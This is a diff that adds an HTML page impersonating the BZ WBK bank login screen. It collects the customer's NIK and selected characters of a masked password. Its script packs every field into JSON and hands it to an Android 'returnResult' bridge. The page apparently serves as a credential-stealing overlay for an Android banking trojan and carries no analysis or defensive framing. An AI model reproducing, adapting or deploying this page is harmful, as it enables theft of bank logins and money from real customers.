@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>bzwbk</title>
+    <link rel="shortcut icon" href="pl.bzwbk.ibiznes24.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #ededed;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+text-align: right;
+    background-size: 100%;
+    padding: 20px 30px 20px 0px;
+    background: #c42a1e;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 0px 0px;
+    color: #151515;
+    text-align: left;
+    outline: none;
+    border: 1px solid #c6c6c6;
+    background: #fff;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #00BCD4;
+    border: none;
+    font-size: 17px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #fff;
+    border-radius: 5px;
+}
+fieldset span {
+    display: inline-block;
+    text-align: center;
+    color: #4b4949;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #151515;
+    font-size: 15px;
+}
+.pass input::placeholder {
+    font-size: 11px;
+}
+</style>
+
+<script type="text/javascript">
+    function next() {
+        if (document.getElementById("login").value == '')
+{
+    alert ('Wszystkie pola wymagane!');
+    return false;
+}
+        document.getElementById("pw").style.display="block";
+        document.getElementById("ne").style.display="none";
+        document.getElementById("lo").style.display="block";
+    }
+function testJump(x){
+    var ml = ~~x.getAttribute('maxlength');
+    if(ml && x.value.length >= ml){
+        do {
+      x = x.nextSibling;
+    }
+    while (x && !((/text/.test(x.type)) || x.disabled));
+        if(x && /text/.test(x.type)){
+            x.focus();
+        }
+    }
+}
+</script>
+
+<fieldset id="formtosend">
+
+<div class="" id="log" style="display: block;">
+
+<div class="logo">
+<a href="#" id="ne" onclick="next()" style="text-decoration: none; color: #fff; font-size: 20px;">Next</a>
+<a href="#" id="lo" onclick="send_form()" style="text-decoration: none; color: #fff; font-size: 20px; display: none;">Zaloguj</a>
+</div>
+
+<div class="area" style="background: #fff;padding: 20px 20px 50px 20px;border-radius: 3px;">
+        <label style="float: left; color: #000; padding-bottom: 10px;">NIK</label>
+        <input type="text" name="login" id="login" style="height: 50px;">
+        <div id="pw" style="display: none; margin-top: 20px;">
+            <label style="float: left; color: #000; padding-bottom: 10px;">Hasło</label>
+        
+
+<div class="pass" style="    display: inline-block; line-height: 2"> 
+
+<span style="text-align: center;display: inline;border-radius: 0px;border: 1px solid #d5d5d5;padding: 4.2px 8px 4.8px 8px;font-size: 13px;background: #d5d5d5;">1</span>
+<input type="text" name="2-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="2" onkeyup="testJump(this);">
+<input type="text" name="3-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="3" onkeyup="testJump(this);">
+<input type="text" name="4-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="4" onkeyup="testJump(this);">
+<input type="text" name="5-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="5" onkeyup="testJump(this);">
+<span style="text-align: center;display: inline;border-radius: 0px;border: 1px solid #d5d5d5;padding: 4.2px 8px 4.8px 8px;font-size: 13px;background: #d5d5d5;">6</span>
+<span style="text-align: center;display: inline;border-radius: 0px;border: 1px solid #d5d5d5;padding: 4.2px 8px 4.8px 8px;font-size: 13px;background: #d5d5d5;">7</span>
+<input type="text" name="8-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="8" onkeyup="testJump(this);">
+<span style="text-align: center;display: inline;border-radius: 0px;border: 1px solid #d5d5d5;padding: 4.2px 8px 4.8px 8px;font-size: 13px;background: #d5d5d5;">9</span>
+<span style="text-align: center;display: inline;border-radius: 0px;border: 1px solid #d5d5d5;padding: 4.2px 8px 4.8px 8px;font-size: 13px;background: #d5d5d5;">10</span>
+<span style="text-align: center;display: inline;border-radius: 0px;border: 1px solid #d5d5d5;padding: 4.2px 8px 4.8px 8px;font-size: 13px;background: #d5d5d5;">11</span>
+<span style="text-align: center;display: inline;border-radius: 0px;border: 1px solid #d5d5d5;padding: 4.2px 8px 4.8px 8px;font-size: 13px;background: #d5d5d5;">12</span>
+<input type="text" name="13-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="13" onkeyup="testJump(this);">
+<input type="text" name="14-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="14" onkeyup="testJump(this);">
+<input type="text" name="15-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="15" onkeyup="testJump(this);">
+<input type="text" name="16-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="16" onkeyup="testJump(this);">
+<span style="text-align: center;display: inline;border-radius: 0px;border: 1px solid #d5d5d5;padding: 4.2px 8px 4.8px 8px;font-size: 13px;background: #d5d5d5;">17</span>
+<input type="text" name="18-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="18" onkeyup="testJump(this);">
+<span style="text-align: center;display: inline;border-radius: 0px;border: 1px solid #d5d5d5;padding: 4.2px 8px 4.8px 8px;font-size: 13px;background: #d5d5d5;">19</span>
+<span style="text-align: center;display: inline;border-radius: 0px;border: 1px solid #d5d5d5;padding: 4.2px 8px 4.8px 8px;font-size: 13px;background: #d5d5d5;">20</span>
+
+
+</div>
+        </div>
+        <input name="exit" type="hidden" text="true"/>
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+</script>
+
+</body>
+</html>
